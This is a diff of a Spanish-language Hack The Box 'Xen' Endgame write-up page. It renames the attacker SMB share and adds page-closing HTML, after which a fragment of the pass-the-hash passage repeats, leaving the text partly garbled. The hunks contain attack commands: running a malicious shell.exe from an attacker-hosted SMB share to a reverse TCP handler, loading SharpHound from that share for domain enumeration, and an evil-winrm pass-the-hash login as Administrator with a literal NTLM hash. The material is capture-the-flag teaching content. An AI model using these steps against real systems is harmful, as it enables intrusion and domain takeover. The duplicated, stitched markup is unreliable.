@@ -301,7 +301,7 @@ PHP 8.2.4 Development Server (http://0.0.0.0:80) started  </span>
 === Trying humongousretail.com:25...
 === Connected to humongousretail.com.
 <-  220 ESMTP MAIL Service ready (EXCHANGE.HTB.LOCAL)
- -> EHLO kali
+ -> EHLO user
 <-  250-CITRIX
 <-  250-SIZE 20480000
 <-  250-AUTH LOGIN
@@ -493,9 +493,9 @@ Final size of exe file: 7168 bytes
 Saved as: shell.exe</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Ahora en el directorio donde hemos creado el <code class="language-plaintext highlighter-rouge">exe</code> malicioso iniciaremos un servicio <code class="language-plaintext highlighter-rouge">smb</code> con un recurso el cual tendra de nombre <code class="language-plaintext highlighter-rouge">kali</code> dandole soporte a <code class="language-plaintext highlighter-rouge">SMBv2</code></p>
+<p class="plain-text">Ahora en el directorio donde hemos creado el <code class="language-plaintext highlighter-rouge">exe</code> malicioso iniciaremos un servicio <code class="language-plaintext highlighter-rouge">smb</code> con un recurso el cual tendra de nombre <code class="language-plaintext highlighter-rouge">user</code> dandole soporte a <code class="language-plaintext highlighter-rouge">SMBv2</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ impacket-smbserver </span><span class="p">kali . -smb2support
+<code><span class="ve">❯ impacket-smbserver </span><span class="p">user . -smb2support
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 [*] Config file parsed
@@ -522,9 +522,9 @@ lport => 443
 </span><span class="az">[*] </span><span class="p">Started reverse TCP handler on 10.10.14.10:443</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Desde la <code class="language-plaintext highlighter-rouge">cmd</code> que tenemos como el usuario <code class="language-plaintext highlighter-rouge">pmorgan</code> ejecutamos el archivo malicioso <code class="language-plaintext highlighter-rouge">shell.exe</code> desde el recurso <code class="language-plaintext highlighter-rouge">smb</code> compartido <code class="language-plaintext highlighter-rouge">kali</code> que hemos creado</p>
+<p class="plain-text">Desde la <code class="language-plaintext highlighter-rouge">cmd</code> que tenemos como el usuario <code class="language-plaintext highlighter-rouge">pmorgan</code> ejecutamos el archivo malicioso <code class="language-plaintext highlighter-rouge">shell.exe</code> desde el recurso <code class="language-plaintext highlighter-rouge">smb</code> compartido <code class="language-plaintext highlighter-rouge">user</code> que hemos creado</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">C:\Users\pmorgan\Desktop></span><span class="am">\\10.10.14.10\kali\shell.exe</span><span class="p">  
+<code><span class="p">C:\Users\pmorgan\Desktop></span><span class="am">\\10.10.14.10\user\shell.exe</span><span class="p">  
 
 C:\Users\pmorgan\Desktop></span>
 </code></pre></div></div><br>
@@ -733,7 +733,7 @@ rtt min/avg/max/mdev = 272.401/272.401/272.401/0.000 ms</span>
 
 <p class="plain-text">Haciendo uso del modulo <a href="https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1">SharpHound.ps1</a> enumeraremos toda la información del <code class="language-plaintext highlighter-rouge">dominio</code>, esto nos creara un <code class="language-plaintext highlighter-rouge">zip</code> con todos los <code class="language-plaintext highlighter-rouge">json</code> que tienen la información</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">PS C:\ProgramData> </span><span class="am">Import-Module </span><span class="p">\\10.10.14.14\kali\SharpHound.ps1
+<code><span class="p">PS C:\ProgramData> </span><span class="am">Import-Module </span><span class="p">\\10.10.14.14\user\SharpHound.ps1
 PS C:\ProgramData> </span><span class="am">Invoke-BloodHound </span><span class="c1">-CollectionMethod </span><span class="p">All
 PS C:\ProgramData> </span><span class="am">dir</span><span class="p">
 
@@ -863,15 +863,6 @@ PORT     STATE SERVICE
 443/tcp  open  https
 3011/tcp open  trusted-web</span>
 </code></pre></div></div><br>
-
-<p class="plain-text">Al abrirla la página <code class="language-plaintext highlighter-rouge">web</code> encontramos un simple panel de <code class="language-plaintext highlighter-rouge">login</code> de <code class="language-plaintext highlighter-rouge">NetScaler</code></p>
-<a href="/endgames/xen/11.png" target="_blank"><div><p><img src="/endgames/xen/11.png"></p></div></a>
-
-<p class="plain-text">De nuevo podemos reutilizar las <code class="language-plaintext highlighter-rouge">credenciales</code> de <code class="language-plaintext highlighter-rouge">pmorgan</code> ya que son válidas</p>
-<a href="/endgames/xen/12.png" target="_blank"><div><p><img src="/endgames/xen/12.png"></p></div></a>
-
-<p class="plain-text">Al hacerlo <code class="language-plaintext highlighter-rouge">accedemos</code> a lo que parece un <code class="language-plaintext highlighter-rouge">dashboard</code> de usuario, despues de buscar en la web nos damos cuenta que no hay nada realmente <code class="language-plaintext highlighter-rouge">interesante</code> para nosotros</p>
-<a href="/endgames/xen/13.png" target="_blank"><div><p><img src="/endgames/xen/13.png"></p></div></a>
 
 <p class="plain-text">Tenemos <code class="language-plaintext highlighter-rouge">credenciales</code> válidas, en este caso las del usuario <code class="language-plaintext highlighter-rouge">mturner</code> que hemos encontrado antes son válidas para el login de <code class="language-plaintext highlighter-rouge">ssh</code>, aunque no nos da una <code class="language-plaintext highlighter-rouge">shell</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
@@ -1562,6 +1553,30 @@ Exploit complete!</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Finalmente podemos simplemente conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> como el usuario <code class="language-plaintext highlighter-rouge">Administrator</code> al <code class="language-plaintext highlighter-rouge">DC</code> haciendo un <code class="language-plaintext highlighter-rouge">passthehash</code> y obtenemos una <code class="language-plaintext highlighter-rouge">powershell</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm </span><span class="p">-i 172.16.249.200 -u Administrator -H 822601ccd7155f47cd955b94af1558be  
+PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
+htb\administrator
+PS C:\Users\Administrator\Documents> </span><span class="am">hostname</span><span class="p">
+DC
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
+ como el usuario <code class="language-plaintext highlighter-rouge">Administrator</code> al <code class="language-plaintext highlighter-rouge">DC</code> haciendo un <code class="language-plaintext highlighter-rouge">passthehash</code> y obtenemos una <code class="language-plaintext highlighter-rouge">powershell</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ evil-winrm </span><span class="p">-i 172.16.249.200 -u Administrator -H 822601ccd7155f47cd955b94af1558be  
 PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
